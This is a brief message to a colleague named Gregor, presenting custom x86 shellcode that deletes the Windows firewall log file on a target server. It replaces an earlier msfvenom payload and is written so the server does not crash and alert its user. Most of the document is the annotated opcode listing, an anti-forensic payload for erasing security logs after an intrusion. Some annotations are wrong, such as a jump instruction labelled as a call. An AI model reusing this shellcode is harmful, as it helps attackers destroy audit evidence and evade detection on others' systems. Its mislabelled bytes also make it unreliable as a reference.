<h2>Custom Shellcode</h2>

Gregor, 

Here is the new code that will delete the Firewall log file. I created this custom shellcode that I put in place of the msfvenom one we used in the past.  See script below:

In order to ensure that it works, I created a pfirewall file to save in the C drive. From here, I pushed the pfirewall.log on the stack. I noticed null bytes, so I removed them by adding 0x11111111. I made sure that the code had the correct amount of parameters set then called the remove memory address. To finish the code off, I made sure there would be a clean exit that wouldnâ€™t crash the server. I then ran the shellcode in a new script in a debugger while looking at the file I created. It deleted as soon as I ran the script. Key lesson was to use call instead of jmp because that would crash the server and tip the user. Also, pay attention to the null bytes.


 
#REMOVE NULLBYTES

"\xc7\xc3\x5b\x5e\x56\xef MOV EBX, 0xEF565E5B

"\x81\xc3\x11\x11\x11\x11" ADD EBX, 0x11111111

"\x53"  PUSH EBX



#PUSH MY PFIREWALL.LOG ONTO THE STACK

"\x8b\xdc"               // mov ebx,esp



#SET STACK Parameters

#CALL A FUNCTION TO DELETE THE FILE

"\x53" push ebx

"\xc7\xc6\xf0\x73\xdc\x73" mov esi, 0x73dc73f0

"\xff\xd6" call, esi remove() 



#EXIT CLEANLY FROM MY SHELLCODE

"\x33\xc0"   //xor eax,eax => eax is now 00000000

"\x50"       //push eax

"\xc7\xc0\xc0\xb3\x8a\x76" // mov eax,0x768ab3c0

"\xff\xe0"  //call eax = launch ExitProcess(0)
